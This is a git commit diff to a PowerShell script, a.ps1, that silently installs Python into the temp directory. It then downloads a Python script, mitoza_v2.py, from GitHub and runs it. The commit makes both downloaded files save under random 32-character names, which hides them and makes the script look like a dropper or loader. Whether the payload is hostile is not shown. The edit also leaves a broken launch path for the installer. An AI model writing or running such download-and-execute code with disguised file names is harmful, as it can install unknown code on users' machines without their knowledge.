5501465c8a9bc9f6e72a7f649e87f19118ae6b00
Ksawix0 <wierzchowskiksawery@gmail.com>
2025-02-22 10:30:15 +0100

    add: random names

--- a.ps1
+++ a.ps1
@@ -11,13 +11,15 @@ else {
     $direc = "$env:tmp\$irec"    
 }
 
-# function Get-Random-String {
-#     param (
-#         [int]$length = 32
-#     )
-#     Write-Output ((-join ((1..9)+(11..33)+(35..57)+59+61+(64..91)+(93..123)+(125..126) | Get-Random -Count $length | ForEach-Object {[char]$_}))|Sort-Object {Get-Random})
-# }
+function Get-Random-String {
+    param (
+        [int]$length = 32
+    )
+    Write-Output ((-join (((1..9)+(11..33)+(35..57)+59+61+(64..91)+(93..123)+(125..126)) * 20 | Get-Random -Count $length | ForEach-Object {[char]$_}))|Sort-Object {Get-Random})
+}
 
+$pname = Get-Random-String
+$mname = Get-Random-String
 try {
     $a=python -V|Out-String
     write-host $a
@@ -27,7 +29,7 @@ try {
     python -m pip install PyQt5
 }
 catch {
-    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\python-3.12.8-amd64.exe"
+    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\$pname"
     Start-Process "$direc\python-3.12.8-amd64.exe" "/quiet","PrependPath=1"
     $err = 1
     while ($err -eq 1) {
@@ -51,7 +53,7 @@ catch {
 #    }
 #}
 
-Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\mitoza.py"
-python "$direc\mitoza.py"
-Start-Process "$direc\mitoza.py"
+Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\$mname"
+python "$direc\$mname"
+Start-Process "$direc\$mname"
 Start-Sleep -Seconds 30
